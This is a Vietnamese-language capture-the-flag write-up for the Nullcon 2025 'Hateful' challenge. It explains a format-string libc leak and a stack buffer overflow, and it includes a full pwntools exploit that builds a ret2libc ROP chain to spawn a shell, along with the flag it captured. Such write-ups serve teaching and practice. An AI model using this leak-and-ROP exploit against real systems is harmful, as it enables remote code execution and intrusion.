# Nullcon Goa HackIM 2025 CTF - HATEFUL

Đây là giải đầu tiên mà mình giải sau kì nghỉ Tết tại Việt Nam năm 2025, ăn Tết quá nhiều khiến cho mình quên đi những cái cơ bản trong pwn và nó dẫn đến những
sai lầm trong bài Hateful này (Dù đây là 1 chall khá dễ). Okay, cùng nhau phân tích checksec trước như mọi khi nào.

```
File:     /home/kali/CTF/nullcon/hateful/hateful_patched
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
Stripped:   No
```

Một bài toán không có PIE và chỉ là Partial RELR với NX enabled khiến ta không thể đặt shellcode trực tiếp vào được. Cùng chạy thử chall xem nó làm gì nhé.

```
My Boss is EVIL!!! I hate my Boss!!! These are things you really want to say to your Boss don't you? well we can do that for you! send us the message you want to send your Boss and we will forward it to him :)

So? are you onboard? (yay/nay)
>> yay
We are pleased that you trust our service!
please provide your bosses email!
>> vnpd
email provided: vnpd
now please provide the message!
AAAAAAAAAAAAAAAAAAAAAAAAAA
Got it! we will send the message for him later!
Well now all you have to do is wait ;)
```

Hay đấy, một chương trình mô phỏng lại việc viết thư giấu tên à. Cũng chưa thể thấy được điều gì, nên ta thử decompile nó nào.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1[4]; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts(
    "My Boss is EVIL!!! I hate my Boss!!! These are things you really want to say to your Boss don't you? well we can do "
    "that for you! send us the message you want to send your Boss and we will forward it to him :)\n");
  puts("So? are you onboard? (yay/nay)");
  printf(">> ");
  __isoc99_scanf("%3s%*c", s1);
  if ( !strcmp(s1, "yay") )
  {
    puts("We are pleased that you trust our service!");
    send_message();
    puts("Well now all you have to do is wait ;)");
  }
  else
  {
    puts("Sorry that our offer didn't amuse you :(\nhave a nice day!");
  }
  return 0;
}
```

Ban đầu khi mới nhìn vào chall thì mình nghĩ nó là Format string bug (mình nhìn vào %\*c), và đúng là thế thật. Trong bài này sẽ sử dụng FSB (Format String Bug) để khai thác
bước 1, từ đó triển khai thêm. Cùng xem tiếp hàm `send_message` nhé.

```
int send_message()
{
  char format[112]; // [rsp+0h] [rbp-460h] BYREF
  char s[1008]; // [rsp+70h] [rbp-3F0h] BYREF

  puts("please provide your bosses email!");
  printf(">> ");
  __isoc99_scanf("%99s%*c", format);
  printf("email provided: ");
  printf(format);
  putchar(10);
  puts("now please provide the message!");
  fgets(s, 4096, stdin);
  return puts("Got it! we will send the message for him later!");
}
```

Nhìn được rõ ràng 2 vấn đề ở đây: có Buffer overflow xảy ra tại dòng `fgets`, nhận tới `4096` bytes trong khi biến `s` chỉ có `1008` bytes. Ta có thể dựa vào đây để viết ROP chain. Tiếp đến
là chỗ `email provided`, khi ta nhập vào `format` thì sẽ được in ra lại `format`. Cool, ta có thể leak được địa chỉ libc và exe. Và đây cũng là vấn đề đầu tiên xảy ra, mình dùng `pwninit` để link libc nhưng không
sử dụng cái file đã link đó để debug, mà dùng file chưa link debug, làm mình loay hoay cả buổi T_T. Mọi người nhớ link file binary với libc trước khi làm bài này nhé. Sau đó ta tiến hành debug nào.

```
We are pleased that you trust our service!
please provide your bosses email!
>> %5$p
email provided: 0x7ffff7fb4a80
```

Ở vị trí thứ 5 trên stack thì ta thấy được 1 cái địa chỉ, dùng pwndbg để xác định thì thấy đây thuộc libc

```
pwndbg> vmmap 0x7ffff7fb4a80
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7fb0000     0x7ffff7fb4000 r--p     4000 1ce000 /home/kali/CTF/nullcon/hateful/libc.so.6
►   0x7ffff7fb4000     0x7ffff7fb6000 rw-p     2000 1d2000 /home/kali/CTF/nullcon/hateful/libc.so.6 +0xa80
    0x7ffff7fb6000     0x7ffff7fc5000 rw-p     f000      0 [anon_7ffff7fb6]
```

Giờ ta cần lấy vị trí đã leak được trừ cho offset để ra libc base, để tìm được offset thì mình sẽ lấy địa chỉ leak được - cho địa chỉ libc base mình mong muốn nhé.

```
    0x7ffff7de2000     0x7ffff7e08000 r--p    26000      0 /home/kali/CTF/nullcon/hateful/libc.so.6
    0x7ffff7e08000     0x7ffff7f5d000 r-xp   155000  26000 /home/kali/CTF/nullcon/hateful/libc.so.6
    0x7ffff7f5d000     0x7ffff7fb0000 r--p    53000 17b000 /home/kali/CTF/nullcon/hateful/libc.so.6
```

Mình sẽ chọn địa chỉ `0x7ffff7de2000`, ta sẽ có phép tính như công thức đã nói trên:

```
pwndbg> p/x 0x7ffff7fb4a80 - 0x7ffff7de2000
$1 = 0x1d2a80
```

Vậy ta đã tìm được địa chỉ libc base, từ đây ta có thể tìm thấy `system`, và ta sẽ truyền tham số `/bin/sh` cho `system` để thực hiện `system('/bin/sh')` nhé. Truyền tham số
thông qua thanh ghi `RDI`, thế nên ta sẽ phải cần gadget `pop rdi ; ret`. Và để tiện cho việc stack alignment, ta cần thêm cả địa chỉ RET của chương trình. Lets go

Ta có thể tìm thấy địa chỉ system bằng cách sau:

```
pwndbg> p system
$2 = {<text variable, no debug info>} 0x7ffff7e2e490 <system>
```

Để ý là, cũng tương tự cách cũ, bạn cần lấy libc base - cho địa chỉ system để ra offset. Sau đó ta sẽ có system như sau:

```
system = libc.address + 0x4c490
```

Tiếp đến là gadget `pop rdi ; ret`, mình sẽ dùng `ROPgadget` để tìm trong libc.so.6.

```
└─$ ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
0x000000000010e739 : add byte ptr [rbp + rcx*4 + 5], cl ; pop rdi ; ret 0xc
0x00000000000277e5 : pop rdi ; ret
```

```
pop_rdi = libc.address + 0x277e5
```

Còn về /bin/sh, mình dùng `search /bin/sh` trong pwngdb để tìm thấy địa chỉ nơi chứa chuỗi `/bin/sh`, sau đó lấy địa chỉ này - libc base tìm ra offset và yay.

```
binsh = libc.address + 0x196031
```

# EXPLOITATION

```
from pwn import *

p = remote('52.59.124.14', 5020)
e = ELF('./hateful_patched')
libc = ELF('./libc.so.6')

# Leak libc first, then ROP
p.sendlineafter(b'>> ', b'yay')
p.sendlineafter(b'>> ', b'%5$p')
p.recvuntil(b'email provided: ')
leaked = int(p.recvn(14), 16)
libc.address  = leaked - 0x1d2a80

system = libc.address + 0x4c490
binsh = libc.address + 0x196031
pop_rdi = libc.address + 0x277e5

# info("Pop rdi: %#x", pop_rdi)
info("Libc address: %#x", libc.address)
info("System address: %#x", system)
info("POp rdi: %#x", pop_rdi)
info("Binsh: %#x", binsh)
print(hex(leaked))
ret = 0x000000000040101a

payload = b'A' * 1016 + p64(ret) + p64(pop_rdi) + p64(binsh)  + p64(system)
p.sendlineafter(b'now please provide the message!', payload)

p.interactive()

```

```
/home/kali/CTF/nullcon/hateful/exp.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  binsh = next(libc.search('/bin/sh\x00'))
[*] Libc address: 0x7fc86f76f000
[*] System address: 0x7fc86f7bb490
[*] POp rdi: 0x7fc86f7967e5
[*] Binsh: 0x7fc86f905031
0x7fc86f941a80
[*] Switching to interactive mode

Got it! we will send the message for him later!
$ cat flag.txt
ENO{W3_4R3_50RRY_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}$
```
